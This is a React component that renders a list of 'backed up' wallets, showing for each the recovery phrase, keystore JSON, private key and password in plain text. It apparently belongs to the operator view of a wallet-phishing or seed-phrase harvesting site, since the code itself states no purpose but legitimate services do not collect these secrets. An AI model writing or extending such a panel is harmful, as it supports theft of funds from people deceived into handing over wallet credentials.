import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import { Accordion, AccordionDetails, AccordionSummary, Typography } from "@mui/material";
import { useMemo } from "react";
import { useGetWithId } from "../../../../../Global/hook/useGetWithId";
import { LoadingModal } from "../../../../../Global/LoadingModal/LoadingModal";

export const BackupNotifications = () => {
  const { data, isLoading, isSuccess } = useGetWithId("backedup");
  const rows = useMemo(() => (data?.data ? Object.values(data.data) : []), [data]);

  if (isLoading) {
    return <LoadingModal />;
  }
  if (rows.length === 0) {
    return <h1 className="p-4 text-center text-xl ">No Wallet Backedup Yet. </h1>;
  }
  if (isSuccess) {
    return (
      <div>
        {rows.map((transaction: any) => (
          <Accordion key={transaction.id}>
            <AccordionSummary expandIcon={<ExpandMoreIcon />} aria-controls="panel1a-content" id="panel1a-header">
              <Typography sx={{ fontWeight: "900" }}>{transaction.walletName}</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <Typography className="flex gap-1">
                <p className="font-bold">Recovery Phrase:</p> {transaction.recoveryPhrase}
              </Typography>
              <Typography className="flex gap-1">
                {" "}
                <p className="font-bold">Keystore Json:</p> {transaction.keystoreJson}
              </Typography>
              <Typography className="flex gap-1">
                <p className="font-bold">Private Key:</p> {transaction.privateKey}
              </Typography>
              <Typography className="flex gap-1">
                <p className="font-bold">Password:</p> {transaction.password}
              </Typography>
            </AccordionDetails>
          </Accordion>
        ))}
      </div>
    );
  }
  return <div>Error occurred while fetching data.</div>;
};
